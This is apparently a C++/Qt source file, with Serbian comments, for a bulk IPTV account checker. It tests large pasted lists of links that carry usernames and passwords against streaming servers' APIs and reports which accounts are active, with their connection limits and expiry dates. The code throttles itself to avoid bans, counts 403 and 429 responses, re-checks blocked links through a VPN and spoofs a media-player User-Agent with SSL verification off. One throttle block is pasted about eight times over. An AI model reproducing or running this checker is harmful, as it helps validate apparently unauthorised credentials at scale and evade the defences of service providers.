    if (ui.find("exp_date") != ui.end()) {
        auto expRaw = ui["exp_date"];
        if (!expRaw.is_null() && expRaw.is_number()) {
            qint64 ts = expRaw.get<qint64>();
            if (ts > 1000000000LL) expiresStr = QDateTime::fromSecsSinceEpoch(ts).toString("dd.MM.yyyy");
        } else if (!expRaw.is_null() && expRaw.is_string()) {
            std::string s = expRaw.get<std::string>();
            if (!s.empty() && s != "None") {
                try {
                    qint64 ts = std::stoll(s);
                    if (ts > 1000000000LL) expiresStr = QDateTime::fromSecsSinceEpoch(ts).toString("dd.MM.yyyy");
                    else expiresStr = QString::fromStdString(s);
                } catch (...) { expiresStr = QString::fromStdString(s); }
            }
        }
    }
    QString testTime  = QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm");
    QString vpnSuffix = vpnTag.isEmpty() ? "" : "\n✅ Radi Sa " + vpnTag + " VPN";
    result.content = QString(
        "URL: %1\nVreme testiranja: %2  Vredi do: %3  Max konekcija: %4  Aktivno konekcija: %5  Status: Active%6\n%7\n"
    ).arg(link, testTime, expiresStr, QString::number(maxConn),
          QString::fromStdString(activeCons), vpnSuffix, QString("─").repeated(100));
    result.maxConn = maxConn;
    result.type    = (maxConn == 1) ? "single" : "multi";
    result.isValid = true;
    result.host    = base;
    return result;
}

// ═══════════════════════════════════════════════════════════════════
// CheckResultMac STRUKTURA
// ═══════════════════════════════════════════════════════════════════

struct CheckResultMac {
    QString mac;
    QString portal;
    QString content;
    bool    isValid;
    int     maxConn;
    CheckResultMac() : isValid(false), maxConn(1) {}
};

// ═══════════════════════════════════════════════════════════════════
// UI KLASE
// ═══════════════════════════════════════════════════════════════════

class FastPasteTextEdit : public QTextEdit {
    Q_OBJECT
public:
    explicit FastPasteTextEdit(QWidget *parent = nullptr) : QTextEdit(parent) {}
protected:
    void insertFromMimeData(const QMimeData *source) override {
        if (!source->hasText()) { QTextEdit::insertFromMimeData(source); return; }
        QString text = source->text();
        if (text.count('\n') < 500) { QTextEdit::insertFromMimeData(source); return; }

        // Sačuvaj stanje pre paste-a za Undo
        m_undoStack.push(toPlainText());

        LineWrapMode prevWrap = lineWrapMode();
        blockSignals(true); document()->blockSignals(true);
        setUndoRedoEnabled(false); setLineWrapMode(QTextEdit::NoWrap);
        QTextCursor cursor = textCursor(); cursor.movePosition(QTextCursor::End);
        QString existing = toPlainText();
        if (!existing.isEmpty() && !existing.endsWith('\n')) cursor.insertText("\n");
        cursor.insertText(text);
        setLineWrapMode(prevWrap); setUndoRedoEnabled(true);
        document()->blockSignals(false); blockSignals(false);
        moveCursor(QTextCursor::End);
    }

    void keyPressEvent(QKeyEvent *event) override {
        // Ctrl+Z — custom Undo za veliki paste
        if (event->modifiers() == Qt::ControlModifier && event->key() == Qt::Key_Z) {
            if (!m_undoStack.empty()) {
                setPlainText(m_undoStack.top());
                m_undoStack.pop();
                moveCursor(QTextCursor::End);
                return;
            }
            QTextEdit::keyPressEvent(event);
            return;
        }
        // Ctrl+V fast paste
        if ((event->modifiers() == Qt::ControlModifier && event->key() == Qt::Key_V) ||
            (event->modifiers() == Qt::ShiftModifier   && event->key() == Qt::Key_Insert)) {
            const QMimeData *mime = QApplication::clipboard()->mimeData();
            if (mime && mime->hasText() && mime->text().count('\n') >= 500) {
                insertFromMimeData(mime); return;
            }
        }
        QTextEdit::keyPressEvent(event);
    }

private:
    std::stack<QString> m_undoStack;
};

class CustomCheckBox : public QCheckBox {
    Q_OBJECT
public:
    CustomCheckBox(const QString &text = "", QWidget *parent = nullptr) : QCheckBox(text, parent) {}
protected:
    void paintEvent(QPaintEvent *) override {
        QPainter painter(this);
        int indicatorSize = 20;
        QRect indicatorRect(0, (height()-indicatorSize)/2, indicatorSize, indicatorSize);
        painter.fillRect(indicatorRect, QColor("#000000"));
        painter.setPen(QPen(QColor(isChecked() ? "#ffffff" : "#666666"), 1));
        painter.drawRect(indicatorRect);
        if (isChecked()) {
            painter.setPen(QPen(Qt::white, 2)); painter.setFont(QFont("Arial", 14, QFont::Bold));
            painter.drawText(indicatorRect, Qt::AlignCenter, "✓");
        }
        QRect textRect(indicatorSize+8, 0, width()-indicatorSize-8, height());
        painter.setPen(Qt::white); painter.setFont(QFont("Arial", 10));
        painter.drawText(textRect, Qt::AlignVCenter, text());
    }
};

class BadgeButton : public QPushButton {
    Q_OBJECT
public:
    BadgeButton(const QString &icon, const QString &text, const QString &g1, const QString &g2, QWidget *parent = nullptr)
        : QPushButton(text, parent), m_icon(icon), m_color1(g1), m_color2(g2) {
        setMinimumHeight(55); setMaximumHeight(55); setFont(QFont("Arial", 10, QFont::Bold));
        setStyleSheet(QString(
            "QPushButton { background: qlineargradient(x1:0,y1:0,x2:1,y2:1,stop:0 %1,stop:1 %2); "
            "color: white; border: 2px solid #ff3333; border-radius: 10px; "
            "padding-left: 50px; padding-right: 15px; text-align: left; }"
            "QPushButton:pressed { background: qlineargradient(x1:0,y1:0,x2:1,y2:1,stop:0 %2,stop:1 %1); }"
        ).arg(m_color1).arg(m_color2));
    }
protected:
    void paintEvent(QPaintEvent *event) override {
        QPushButton::paintEvent(event);
        QPainter painter(this);
        painter.setRenderHint(QPainter::Antialiasing);
        painter.setBrush(QColor(255,255,255,40)); painter.setPen(Qt::NoPen);
        painter.drawEllipse(8, 8, 39, 39);
        painter.setPen(Qt::white); painter.setFont(QFont("Arial", 13, QFont::Bold));
        painter.drawText(QRect(8, 8, 39, 39), Qt::AlignCenter, m_icon);
    }
private:
    QString m_icon, m_color1, m_color2;
};

// ═══════════════════════════════════════════════════════════════════
// WORKER KLASA
// ═══════════════════════════════════════════════════════════════════

class Worker : public QObject {
    Q_OBJECT
public:
    Worker(QObject *parent = nullptr) : QObject(parent) {}
    void requestStop() { m_stopRequested.store(true, std::memory_order_release); }
    bool isStopped()   const { return m_stopRequested.load(std::memory_order_acquire); }
    void setVpnTag(const QString &tag) { m_vpnTag = tag; }

signals:
    void progressUpdated(int current, int total, double speed);
    void resultFound(const CheckResult &result);
    void checkFinished(bool wasStopped);
    void phaseChanged(const QString &text);
    void vpnDetected(const QString &country);
    void serverBanDetected(const QString &serverBase, const QString &reportText);

public slots:

    void runCheck(const QList<QString> &links, bool phase2, bool trackBlocked) {
        int total = links.size();
        QList<QString> retryLinks;
        QDateTime startTime = QDateTime::currentDateTime();
        int current = 0;
        emit phaseChanged("Faza 1: Brza provera...");
        for (const QString &link : links) {
            if (m_stopRequested.load(std::memory_order_acquire)) break;
            current++;
            qint64 elapsed = startTime.msecsTo(QDateTime::currentDateTime());
            double speed   = (elapsed > 0) ? (current * 1000.0 / elapsed) : 0.0;
            emit progressUpdated(current, total, speed);
            CheckResult res = checkPhase1(link);
            if (res.isValid) { emit resultFound(res); }
            else if (res.type == "blocked" && trackBlocked) {
                CheckResult b; b.type = "blocked";
                b.content = link + "\n🔒 BLOKIRANA IP / POTREBAN VPN\n" + QString("─").repeated(100) + "\n";
                emit resultFound(b);
            } else if (res.type == "retry" && phase2) { retryLinks.append(link); }
        }
        if (!m_stopRequested.load() && phase2 && !retryLinks.isEmpty()) {
            emit phaseChanged(QString("Faza 2: Spora provera (%1 linkova)...").arg(retryLinks.size()));
            int total2 = retryLinks.size(), current2 = 0;
            startTime = QDateTime::currentDateTime();
            for (const QString &link : retryLinks) {
                if (m_stopRequested.load(std::memory_order_acquire)) break;
                current2++;
                qint64 elapsed = startTime.msecsTo(QDateTime::currentDateTime());
                double speed   = (elapsed > 0) ? (current2 * 1000.0 / elapsed) : 0.0;
                emit progressUpdated(current2, total2, speed);
                CheckResult res = checkPhase2(link);
                if (res.isValid) { emit resultFound(res); }
                else if (res.type == "blocked" && trackBlocked) {
                    CheckResult b; b.type = "blocked";
                    b.content = link + "\n🔒 BLOKIRANA IP (Faza 2)\n" + QString("─").repeated(100) + "\n";
                    emit resultFound(b);
                }
            }
        }
        emit checkFinished(m_stopRequested.load());
    }

    void runPlayable(const QList<QString> &links) {
        qDebug() << "[PLAYABLE_WORKER] runPlayable START, linkova=" << links.size();

        // Reset TCP dead countera za svako novo skeniranje
        // (sprečava da prethodni scan zagadi stanje za novi)
        {
            std::lock_guard<std::mutex> lk(g_tcpDeadMutex);
            g_serverConsecTimeouts.clear();
        }
        {
            std::lock_guard<std::mutex> lk(g_xuiDebugMutex);
            g_xuiDebugCount.clear();
            g_xuiDebugExpiry.clear();
            g_xuiEpisodeCount.clear();
        }
        // Reset CF + nginx ban trackera za svako novo skeniranje
        {
            std::lock_guard<std::mutex> lk(m_cfBanMutex);
            m_cfBanCount.clear();
            m_cfBanReported.clear();
        }
        {
            std::lock_guard<std::mutex> lk(m_nginxBanMutex);
            m_nginxBanReported.clear();
        }
        // Reset reactive throttle state za svako novo skeniranje
        {
            std::lock_guard<std::mutex> lk(g_reactMutex);
            for (auto* rt : g_reactThrottle) {
                std::lock_guard<std::mutex> rlk(rt->mx);
                rt->total403     = 0;
                rt->total429     = 0;
                rt->isAggressive = false;
                rt->delayMs      = 150;
                rt->minDelayMs   = 50;
                rt->consecOk     = 0;
                rt->consecFail   = 0;
            }
        }
        // Reset reactive throttle za svako novo skeniranje (briše total403 i aggressive flag)
        {
            std::lock_guard<std::mutex> lk(g_reactMutex);
            for (auto* rt : g_reactThrottle) {
                std::lock_guard<std::mutex> rlk(rt->mx);
                rt->total403     = 0;
                rt->total429     = 0;
                rt->isAggressive = false;
                rt->delayMs      = 150;
                rt->minDelayMs   = 50;
                rt->consecOk     = 0;
                rt->consecFail   = 0;
            }
        }
        // Reset nginx ban reported set za svako novo skeniranje
        {
            static std::mutex _nginxBanMutex;
            static QSet<QString> _nginxBanReported;
            // Ovo je static unutar doApiParse — ne možemo ga resetovati ovde direktno.
            // Rešenje: koristimo member varijablu umesto static.
        }
        // Reset TCP ping cache za svako novo skeniranje
        {
            std::lock_guard<std::mutex> lk(g_tcpPingCacheMutex);
            g_tcpPingResultCache.clear();
        }
        m_poolDmDetected.store(false);
        xuiAnalyzerReset();
        resetSeqThrottle();
        // Reset movie stream ID cache za svako novo skeniranje
        {
            std::lock_guard<std::mutex> lk(g_movieIdCacheMutex);
            g_movieStreamId.clear();
            g_movieStreamExt.clear();
            qDebug() << "[MOVIE_CACHE] Reset movie cache.";
        }
        // Reset debug analyzer statistika za sve servere
        {
            std::lock_guard<std::mutex> lk(g_serverDebugMutex);
            for (auto* s : g_serverDebugStats) {
                std::lock_guard<std::mutex> slk(s->mx);
                s->records.clear();
                s->totalApi = s->totalM3u = s->totalStream = 0;
                s->totalDebugMode = s->totalJsonOk = s->totalStreamOk = 0;
                s->totalTimeout = s->totalHttpErr = 0;
                s->firstSet = false;
            }
            qDebug() << "[DEBUG_ANALYZER] Reset svih server statistika.";
        }

        int total = links.size();
        QDateTime startTime = QDateTime::currentDateTime();

        emit phaseChanged("DNS resolving...");
        {
            QSet<QString> uniqueHosts;
            for (const QString &link : links) {
                auto hp = parseHostPort(extractBaseUrlSafe(link));
                uniqueHosts.insert(hp.first);
            }
            auto dnsF = std::async(std::launch::async, [&uniqueHosts]() {
                batchDnsResolve(uniqueHosts.values());
            });
            dnsF.wait_for(std::chrono::seconds(5));
        }

        if (m_stopRequested.load(std::memory_order_acquire)) { emit checkFinished(true); return; }

        emit phaseChanged(QString("Provera Playable: %1 lista...").arg(total));

        auto progressMutex   = std::make_shared<std::mutex>();
        auto processedCount  = std::make_shared<std::atomic<int>>(0);
        auto debugRetryLinks = std::make_shared<QList<QString>>();
        auto debugRetryMutex = std::make_shared<std::mutex>();
        StdThreadPool pool(2);
        std::atomic<bool> &stopFlag = m_stopRequested;

        for (int idx = 0; idx < links.size(); ++idx) {
            if (stopFlag.load(std::memory_order_acquire)) break;

            QString linkCopy = links[idx];
            QString baseCopy = extractBaseUrlSafe(linkCopy);

            pool.enqueue([this, linkCopy, baseCopy, total, processedCount, progressMutex, startTime, &stopFlag, debugRetryLinks, debugRetryMutex]() {

                auto updateProgress = [this, processedCount, progressMutex, total, startTime]() {
                    std::lock_guard<std::mutex> lock(*progressMutex);
                    int c = ++(*processedCount);
                    qint64 el = startTime.msecsTo(QDateTime::currentDateTime());
                    emit this->progressUpdated(c, total, el > 0 ? c*1000.0/el : 0.0);
                };

                if (stopFlag.load(std::memory_order_acquire)) { updateProgress(); return; }

                {
                    // ✅ AGRESIVNA PAUZA - SPRJEČAVANJE 403 BAN-a
                {
                    static std::atomic<int> g_lastRequestMs{0};
                    int nowMs = QDateTime::currentDateTime().toMSecsSinceEpoch() % 1000000;
                    int lastMs = g_lastRequestMs.load();
                    int gapMs = nowMs - lastMs;
                    
                    if (gapMs < 3000) {  // Ako je manje od 3 sekunde od prošlog zahtjeva
                        int pauseMs = 3000 - gapMs;
                        qDebug() << "[ANTI-BAN] Gap samo" << gapMs << "ms → čekam" << pauseMs << "ms";
                        std::this_thread::sleep_for(std::chrono::milliseconds(pauseMs));
                    }
                    
                    g_lastRequestMs.store(nowMs);
                }
                
                {
                    auto* _rt = getReactThrottle(baseCopy);
                    int _maxSlots;
                    { std::lock_guard<std::mutex> _lk(_rt->mx); _maxSlots = (isXuiSlowServer(baseCopy) || _rt->isAggressive || m_poolDmDetected.load()) ? 1 : 2; }
                    acquireServerSlot(baseCopy, _maxSlots, stopFlag);
                }

                if (stopFlag.load(std::memory_order_acquire)) {
                    releaseServerSlot(baseCopy);
                    updateProgress();
                    return;
                }

                                // ✅ DINAMIČKA PAUZA IZMEĐU LISTA - SPRJEČAVANJE BANA
                {
                    bool isDebugActive = isXuiDebugMode(baseCopy);
                    int pauseMs = 0;
                    
                    if (isDebugActive) {
                        pauseMs = 10000;  // 10 sekundi ako je Debug Mode
                        qDebug() << "[INTER-CHECK THROTTLE] Debug Mode aktivan → pauza 10s";
                    } else {
                        pauseMs = 500;  // 500ms inače (minimalna pauza)
                    }
                    
                    // Primijeni pauz
                    for (int _w = 0; _w < pauseMs / 100 && !stopFlag.load(); _w++) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }

                                // ✅ DINAMIČKA PAUZA IZMEĐU LISTA - SPRJEČAVANJE BANA
                {
                    bool isDebugActive = isXuiDebugMode(baseCopy);
                    int pauseMs = 0;
                    
                    if (isDebugActive) {
                        pauseMs = 10000;  // 10 sekundi ako je Debug Mode
                        qDebug() << "[INTER-CHECK THROTTLE] Debug Mode aktivan → pauza 10s";
                    } else {
                        pauseMs = 500;  // 500ms inače (minimalna pauza)
                    }
                    
                    // Primijeni pauz
                    for (int _w = 0; _w < pauseMs / 100 && !stopFlag.load(); _w++) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }

                                // ✅ DINAMIČKA PAUZA IZMEĐU LISTA - SPRJEČAVANJE BANA
                {
                    bool isDebugActive = isXuiDebugMode(baseCopy);
                    int pauseMs = 0;
                    
                    if (isDebugActive) {
                        pauseMs = 10000;  // 10 sekundi ako je Debug Mode
                        qDebug() << "[INTER-CHECK THROTTLE] Debug Mode aktivan → pauza 10s";
                    } else {
                        pauseMs = 500;  // 500ms inače (minimalna pauza)
                    }
                    
                    // Primijeni pauz
                    for (int _w = 0; _w < pauseMs / 100 && !stopFlag.load(); _w++) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }

                // ✅ DINAMIČKA PAUZA IZMEĐU LISTA - SPRJEČAVANJE BANA
                {
                    bool isDebugActive = isXuiDebugMode(baseCopy);
                    int pauseMs = 0;
                    
                    if (isDebugActive) {
                        pauseMs = 10000;  // 10 sekundi ako je Debug Mode
                        qDebug() << "[INTER-CHECK THROTTLE] Debug Mode aktivan → pauza 10s";
                    } else {
                        pauseMs = 500;  // 500ms inače (minimalna pauza)
                    }
                    
                    // Primijeni pauz
                    for (int _w = 0; _w < pauseMs / 100 && !stopFlag.load(); _w++) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }

                // ✅ DINAMIČKA PAUZA IZMEĐU LISTA - SPRJEČAVANJE BANA
                {
                    bool isDebugActive = isXuiDebugMode(baseCopy);
                    int pauseMs = 0;
                    
                    if (isDebugActive) {
                        pauseMs = 10000;  // 10 sekundi ako je Debug Mode
                        qDebug() << "[INTER-CHECK THROTTLE] Debug Mode aktivan → pauza 10s";
                    } else {
                        pauseMs = 500;  // 500ms inače (minimalna pauza)
                    }
                    
                    // Primijeni pauz
                    for (int _w = 0; _w < pauseMs / 100 && !stopFlag.load(); _w++) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }

                                // ✅ DINAMIČKA PAUZA IZMEĐU LISTA - SPRJEČAVANJE BANA
                {
                    bool isDebugActive = isXuiDebugMode(baseCopy);
                    int pauseMs = 0;
                    
                    if (isDebugActive) {
                        pauseMs = 10000;  // 10 sekundi ako je Debug Mode
                        qDebug() << "[INTER-CHECK THROTTLE] Debug Mode aktivan → pauza 10s";
                    } else {
                        pauseMs = 500;  // 500ms inače (minimalna pauza)
                    }
                    
                    // Primijeni pauz
                    for (int _w = 0; _w < pauseMs / 100 && !stopFlag.load(); _w++) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }

                                // ✅ DINAMIČKA PAUZA IZMEĐU LISTA - SPRJEČAVANJE BANA
                {
                    bool isDebugActive = isXuiDebugMode(baseCopy);
                    int pauseMs = 0;
                    
                    if (isDebugActive) {
                        pauseMs = 10000;  // 10 sekundi ako je Debug Mode
                        qDebug() << "[INTER-CHECK THROTTLE] Debug Mode aktivan → pauza 10s";
                    } else {
                        pauseMs = 500;  // 500ms inače (minimalna pauza)
                    }
                    
                    // Primijeni pauz
                    for (int _w = 0; _w < pauseMs / 100 && !stopFlag.load(); _w++) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }

                // ✅ DINAMIČKA PAUZA IZMEĐU LISTA - SPRJEČAVANJE BANA
                {
                    bool isDebugActive = isXuiDebugMode(baseCopy);
                    int pauseMs = 0;
                    
                    if (isDebugActive) {
                        pauseMs = 10000;  // 10 sekundi ako je Debug Mode
                        qDebug() << "[INTER-CHECK THROTTLE] Debug Mode aktivan → pauza 10s";
                    } else {
                        pauseMs = 500;  // 500ms inače (minimalna pauza)
                    }
                    
                    // Primijeni pauz
                    for (int _w = 0; _w < pauseMs / 100 && !stopFlag.load(); _w++) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }

                try {
                    QDateTime _t0 = QDateTime::currentDateTime();
                    qDebug() << "[PLAYABLE_WORKER] >>> checkPlayable START:" << linkCopy.left(60);
                    qDebug() << "[TIMING_SLOT] server=" << baseCopy
                             << "active_slots=" << g_serverActiveCalls.value(baseCopy, 0)
                             << "time=" << _t0.toString("HH:mm:ss.zzz");
                    CheckResult result;
                    bool ok = checkPlayable(linkCopy, result);
                    int _ms = (int)_t0.msecsTo(QDateTime::currentDateTime());
                    qDebug() << "[PLAYABLE_WORKER] <<< checkPlayable END, ok=" << ok
                             << "trajanje=" << _ms << "ms";
                    if (ok && !stopFlag.load()) {
                        emit resultFound(result);
                    }
                    } catch (const std::exception &ex) {
                    qDebug() << "[PLAYABLE_WORKER] !!! STD EXCEPTION u checkPlayable:"
                             << QString::fromStdString(ex.what())
                             << "link=" << linkCopy.left(60);
                } catch (...) {
                    qDebug() << "[PLAYABLE_WORKER] !!! UNKNOWN EXCEPTION u checkPlayable!"
                             << "link=" << linkCopy.left(60);
                }

                releaseServerSlot(baseCopy);
                updateProgress();
            });
        }

        pool.waitForAllOrStop(stopFlag);

// Retry faza uklonjena — api_auth_ok je dovoljan kriterijum za playable
        if (!debugRetryLinks->isEmpty()) {
            qDebug() << "[PLAYABLE_RETRY] Retry faza UKLONJENA. Liste koje su imale DM stream"
                     << "su već obrađene kroz api_auth_ok fallback. Count="
                     << debugRetryLinks->size();
        }

    // === ADVANCED DEBUG: Timeline + Finalni izveštaji za sve servere ===
    {
        std::lock_guard<std::mutex> lk(g_serverDebugMutex);
        for (auto it = g_serverDebugStats.begin(); it != g_serverDebugStats.end(); ++it) {
            debugPrintTimeline(it.key());
            debugPrintFinalReport(it.key());
        }
    }
    // === END ADVANCED DEBUG ===

    emit checkFinished(m_stopRequested.load());
    }

    void runVpnRetry(const QList<QString> &links) {
    int total = links.size();
        QDateTime startTime = QDateTime::currentDateTime();
        QString country = m_vpnTag;
        if (country.isEmpty()) { country = detectVpnLocation(); if (country.isEmpty()) country = "Unknown"; }
        m_vpnTag = country;
        emit phaseChanged(QString("Provera sa %1 VPN...").arg(country));

        std::mutex progressMutex;
        std::atomic<int> processedCount(0);
        std::atomic<bool> &stopFlag = m_stopRequested;

        StdThreadPool pool(8);

        for (int idx = 0; idx < links.size(); ++idx) {
            if (stopFlag.load(std::memory_order_acquire)) break;

            QString linkCopy = links[idx];
            QString baseCopy = extractBaseUrlSafe(linkCopy);

            pool.enqueue([this, linkCopy, baseCopy, total, &processedCount, &progressMutex, startTime, &stopFlag]() {

                auto updateProgress = [&]() {
                    std::lock_guard<std::mutex> lock(progressMutex);
                    int c = ++processedCount;
                    qint64 el = startTime.msecsTo(QDateTime::currentDateTime());
                    emit this->progressUpdated(c, total, el > 0 ? c*1000.0/el : 0.0);
                };

                if (stopFlag.load(std::memory_order_acquire)) { updateProgress(); return; }

                acquireServerSlot(baseCopy, 3, stopFlag);

                if (stopFlag.load(std::memory_order_acquire)) {
                    releaseServerSlot(baseCopy);
                    updateProgress();
                    return;
                }

                try {
                    CheckResult result;
                    bool ok = checkPlayable(linkCopy, result);
                    if (ok && !stopFlag.load()) {
                        if (result.vpnTag.isEmpty()) result.vpnTag = m_vpnTag;
                        emit resultFound(result);
                    }
                } catch (...) {}

                releaseServerSlot(baseCopy);
                updateProgress();
            });
        }

        pool.waitForAllOrStop(stopFlag);
        emit checkFinished(m_stopRequested.load());
    }

    private:
    std::atomic<bool> m_stopRequested;
    std::atomic<bool> m_inRetryPhase;
    std::atomic<bool> m_poolDmDetected{false};
    QString m_vpnTag;

    // CF ban tracking po serveru za Playable proveru
    std::mutex m_cfBanMutex;
    QMap<QString, int> m_cfBanCount;
    QSet<QString> m_cfBanReported;
    static const int CF_BAN_THRESHOLD = 3;

    // Nginx ban tracking (member umesto static — može se resetovati)
    std::mutex m_nginxBanMutex;
    QSet<QString> m_nginxBanReported;

    QString detectVpnLocation() {
        try {
            cpr::Response r = cpr::Get(cpr::Url{"https://ipinfo.io/json"}, cpr::Timeout{5000});
            if (r.status_code == 200) {
                auto j = json::parse(r.text);
                if (j.contains("country")) {
                    std::string code = j["country"].get<std::string>();
                    if (!code.empty() && code != "null") return QString::fromStdString(code);
                }
            }
        } catch (...) {}
        try {
            cpr::Response r = cpr::Get(cpr::Url{"https://ipapi.co/json/"}, cpr::Timeout{5000});
            if (r.status_code == 200) {
                auto j = json::parse(r.text);
                if (j.contains("country_code"))
                    return QString::fromStdString(j["country_code"].get<std::string>());
            }
        } catch (...) {}
        return "";
    }

    CheckResult checkPhase1(const QString &link) {
        CheckResult result; result.isValid = false; result.type = "inactive"; result.vpnTag = m_vpnTag;
        QString apiUrl = buildApiUrl(link);
        if (apiUrl.isEmpty()) return result;
        QString base = extractBaseUrlSafe(link);
        QMap<QString, QString> headers = getHeadersForHost(base);
        try {
            auto r = cpr::Get(cpr::Url{apiUrl.toStdString()}, cpr::Timeout{2000}, cpr::VerifySsl{false},
                cpr::Header{{"User-Agent", headers["User-Agent"].toStdString()}, {"Host", headers["Host"].toStdString()}});
            if (r.status_code == 200) {
                try {
                    auto jp = json::parse(r.text);
                    CheckResult ex = extractResult(jp, link, base, m_vpnTag);
                    if (ex.isValid) return ex;
                } catch (...) {}
            } else if (r.status_code == 403) {
                result.type = "blocked";
                result.content = link + "\n🔒 BLOKIRANA IP / POTREBAN VPN\n" + QString("─").repeated(100) + "\n";
                return result;
            } else if (r.status_code == 503 || r.status_code == 429) {
                result.type = "retry"; return result;
            }
        } catch (...) { result.type = "retry"; return result; }
        result.type = "retry"; return result;
    }

    CheckResult checkPhase2(const QString &link) {
        QString apiUrl = buildApiUrl(link);
        if (apiUrl.isEmpty()) { CheckResult r; r.type = "inactive"; r.vpnTag = m_vpnTag; return r; }
        QString base = extractBaseUrlSafe(link);
        try {
            auto r = cpr::Get(cpr::Url{apiUrl.toStdString()}, cpr::Timeout{25000}, cpr::VerifySsl{false},
                cpr::Redirect{false}, cpr::Header{{"User-Agent", "Lavf53.32.100"}});
            if (r.status_code == 200) {
                try { auto jp = json::parse(r.text); return extractResult(jp, link, base, m_vpnTag); } catch (...) {}
            }
            if (r.status_code == 429 || r.status_code == 503) {
                std::this_thread::sleep_for(std::chrono::milliseconds(1000));
                auto r2 = cpr::Get(cpr::Url{apiUrl.toStdString()}, cpr::Timeout{25000}, cpr::VerifySsl{false},
                    cpr::Redirect{false}, cpr::Header{{"User-Agent", "Lavf53.32.100"}});
                if (r2.status_code == 200) {
                    try { auto jp = json::parse(r2.text); return extractResult(jp, link, base, m_vpnTag); } catch (...) {}
                }
            }
            if (r.status_code == 403) { CheckResult res; res.type = "blocked"; res.vpnTag = m_vpnTag; return res; }
        } catch (...) {}
        CheckResult r; r.type = "inactive"; r.vpnTag = m_vpnTag; return r;
    }
        static bool isRealMediaBody(const std::string &body, const std::string &ctRaw) {
    if (body.size() < 32) return false;
    std::string ct = ctRaw;
    std::transform(ct.begin(), ct.end(), ct.begin(), ::tolower);
    auto startsWith = [&](const char *pfx, size_t n) {
        return body.size() >= n && body.substr(0, n) == std::string(pfx, n);
    };
    if (startsWith("<html", 5) || startsWith("<!doc", 5) || startsWith("<?xml", 5)) return false;
    if (!body.empty() && (body[0] == '{' || body[0] == '[')) return false;
    if (startsWith("HTTP/", 5)) return false;
    if (startsWith("error", 5) || startsWith("Error", 5)) return false;
    if (startsWith("#EXTM3U", 7)) return true;
    if (body.size() >= 4 &&
        (unsigned char)body[0] == 0x1A && (unsigned char)body[1] == 0x45) return true;
    if (body.size() >= 188) {
        for (size_t i = 0; i < std::min(body.size(), (size_t)564); i++) {
            if ((unsigned char)body[i] == 0x47 &&
                i + 188 < body.size() &&
                (unsigned char)body[i + 188] == 0x47) return true;
        }
    }
    if (body.size() >= 8) {
        std::string box = body.substr(4, 4);
        if (box == "ftyp" || box == "moov" || box == "moof" || box == "mdat") return true;
    }
    if (body.size() >= 4 &&
        (unsigned char)body[0] == 0xFF &&
        ((unsigned char)body[1] & 0xE0) == 0xE0) return true;
    bool ctIsMedia = ct.find("video")    != std::string::npos ||
                     ct.find("audio")    != std::string::npos ||
                     ct.find("mpeg")     != std::string::npos ||
                     ct.find("matroska") != std::string::npos ||
                     ct.find("mp4")      != std::string::npos ||
                     ct.find("octet")    != std::string::npos ||
                     ct.find("stream")   != std::string::npos ||
                     ct.find("mpegurl")  != std::string::npos;
    if (ctIsMedia && body.size() >= 512) return true;
    return false;
}
                bool checkPlayable(const QString &link, CheckResult &outResult) {
    qDebug() << "[CP] ===== checkPlayable ENTER =====" << link.left(60);
    outResult.isValid = false;
    outResult.vpnTag  = m_vpnTag;

    QString apiUrl = buildApiUrl(link);
    qDebug() << "[PLAYABLE DEBUG] link:" << link.left(80);
    qDebug() << "[PLAYABLE DEBUG] apiUrl:" << apiUrl.left(80);
    if (apiUrl.isEmpty()) return false;

    QString base     = extractBaseUrlSafe(link);
    QString username = extractQueryParam(link, "username");
    QString password = extractQueryParam(link, "password");
    qDebug() << "[PLAYABLE DEBUG] base:" << base << "user:" << username.left(4) << "pass:" << password.left(4);
    if (base.isEmpty() || username.isEmpty() || password.isEmpty()) return false;

    QMap<QString, QString> headers = getHeadersForHost(base);

    int     max_conn    = 1;
    QString active_cons = "nepoznato";
    QString exp_date    = "Unlimited";
    bool    api_auth_ok = false;

    auto fillResult = [&]() -> bool {
        QString test_time = QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm");
        QString vpnDisplay = m_vpnTag;
        if (!m_vpnTag.isEmpty()) {
            QLocale::Territory vt = QLocale::codeToTerritory(m_vpnTag);
            if (vt != QLocale::AnyTerritory)
                vpnDisplay = QLocale::territoryToString(vt);
        }
        QString vpnSuffix = m_vpnTag.isEmpty() ? "" : "\n✅ Radi Na " + vpnDisplay + " VPN!";
        outResult.type    = (max_conn == 1) ? "single" : "multi";
        outResult.content = QString(
            "URL: %1\nVreme testiranja: %2  Vredi do: %3  "
            "Max konekcija: %4  Aktivno konekcija: %5  Status: Active%6\n%7\n"
        ).arg(link, test_time, exp_date, QString::number(max_conn), active_cons, vpnSuffix,
              QString("─").repeated(100));
        outResult.maxConn = max_conn;
        outResult.isValid = true;
        return true;
    };

    if (m_stopRequested.load(std::memory_order_acquire)) return false;

    // ═══ API TEST ═══
    {
        QDateTime t0 = QDateTime::currentDateTime();
        int effective_timeout = m_stopRequested.load() ? 300 : 8000;
        try {
            cpr::Response r = cpr::Get(
                cpr::Url{apiUrl.toStdString()}, 
                cpr::Timeout(effective_timeout),
                cpr::VerifySsl{false},
                cpr::Header{{"User-Agent", headers["User-Agent"].toStdString()},
                            {"Host", headers["Host"].toStdString()}}
            );
            
            int latency = (int)t0.msecsTo(QDateTime::currentDateTime());
            int api_status = r.status_code;
            
            qDebug() << "[API TEST]" << apiUrl.left(80)
                     << "status:" << api_status
                     << "body[:150]:" << QString::fromStdString(r.text).left(150);
            
            // TIMEOUT
            if (r.error.code == cpr::ErrorCode::OPERATION_TIMEDOUT || r.status_code == 0) {
                qDebug() << "[API TIMEOUT] Zahtjev nije odgovorio (timeout ili connection failed)";
                qDebug() << "[API TIMEOUT] Error code:" << (int)r.error.code;
                qDebug() << "[API TIMEOUT] URL:" << apiUrl.left(80);
                return false;
            }
            
            // 429 / 503 RATE-LIMIT
            if (r.status_code == 429 || r.status_code == 503) {
                qDebug() << "[API] Rate-limit" << r.status_code << "→ return false";
                return false;
            }
            
